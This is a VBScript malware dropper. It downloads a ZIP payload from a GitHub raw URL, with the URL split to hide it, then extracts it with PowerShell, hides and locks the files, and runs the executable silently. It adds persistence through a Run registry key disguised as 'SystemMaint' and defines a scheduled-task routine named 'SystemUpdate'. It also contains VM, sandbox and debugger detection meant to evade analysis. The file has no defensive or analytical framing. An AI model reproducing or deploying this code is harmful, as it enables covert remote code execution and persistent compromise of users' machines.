Option Explicit
On Error Resume Next

Dim shell, fso, url, zipFile, extractDir, exePath, http, stream, zip, dest, waitCount

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

Function DetectVM()
    Dim regKey
    On Error Resume Next
    regKey = shell.RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmhgfs")
    If Err.Number = 0 Then
        DetectVM = True
        Exit Function
    End If
    regKey = shell.RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VBoxService")
    If Err.Number = 0 Then
        DetectVM = True
        Exit Function
    End If
    DetectVM = False
End Function

Function DetectSandbox()
    Dim sandboxPaths, i
    sandboxPaths = Array("C:\cwsandbox\", "C:\Cuckoo\", "C:\analysis\")
    For i = 0 To UBound(sandboxPaths)
        If fso.FolderExists(sandboxPaths(i)) Then
            DetectSandbox = True
            Exit Function
        End If
    Next
    DetectSandbox = False
End Function

Function DetectAPIHooks()
    Dim regKey
    On Error Resume Next
    regKey = shell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinDbgPath")
    If Err.Number = 0 Then
        DetectAPIHooks = True
        Exit Function
    End If
    DetectAPIHooks = False
End Function

Sub InjectViaTaskScheduler()
    Dim taskName, cmd
    On Error Resume Next
    taskName = "SystemUpdate" & Int(Rnd * 10000)
    cmd = "schtasks /create /tn """ & taskName & """ /tr ""cscript.exe " & WScript.ScriptFullName & """ /sc onlogon /rl highest /f"
    shell.Run cmd, 0, True
    On Error GoTo 0
End Sub

Sub DownloadAndExecute()
    url = "https://raw.githubuserc" & "ontent.com/darkislivenow-cloud/DarkDevPC/main/Payload.zip"
    zipFile = "C:\Temp\payload.zip"
    extractDir = "C:\Temp\extracted"
    exePath = extractDir & "\Payload.exe"
    
    On Error Resume Next
    If fso.FolderExists(extractDir) Then fso.DeleteFolder extractDir, True
    fso.CreateFolder "C:\Temp"
    fso.CreateFolder extractDir
    On Error GoTo 0
    
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.SetRequestHeader "User-Agent", "Mozilla/5.0"
    http.Send
    
    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile zipFile, 2
        stream.Close
        
        ' Make ZIP file hidden and read-only to prevent deletion
        On Error Resume Next
        shell.Run "attrib +h +r """ & zipFile & """", 0, True
        On Error GoTo 0
        
        If fso.FileExists(zipFile) Then
            Dim psCmd
            psCmd = "Expand-Archive -Path '" & zipFile & "' -DestinationPath '" & extractDir & "' -Force"
            
            On Error Resume Next
            shell.Run "powershell.exe -Command """ & psCmd & """", 0, True
            On Error GoTo 0
            
            WScript.Sleep 2000
            
            If fso.FileExists(exePath) Then
                ' Make extracted folder hidden/protected from deletion
                shell.Run "attrib +h +r """ & extractDir & """ /s /d", 0, True
                shell.Run "icacls """ & extractDir & """ /grant *S-1-5-32-544:(OI)(CI)F /T", 0, True
                
                ' Execute payload
                shell.Run """" & exePath & """", 0, False
                
                ' Keep payload process alive - prevent deletion while running
                ' Add delay so process stays resident
                WScript.Sleep 5000
            Else
                ' Fallback: find any EXE in extracted folder
                Dim folder, file
                Set folder = fso.GetFolder(extractDir)
                For Each file In folder.Files
                    If Right(file.Name, 4) = ".exe" Then
                        shell.Run "attrib +h +r """ & file.Path & """", 0, True
                        shell.Run """" & file.Path & """", 0, False
                        Exit For
                    End If
                Next
            End If
        End If
    End If
End Sub

Randomize

' Direct execution - VM/Sandbox checks disabled for testing
Call DownloadAndExecute()

' Add persistence
On Error Resume Next
shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\SystemMaint", WScript.ScriptFullName, "REG_SZ"
On Error GoTo 0
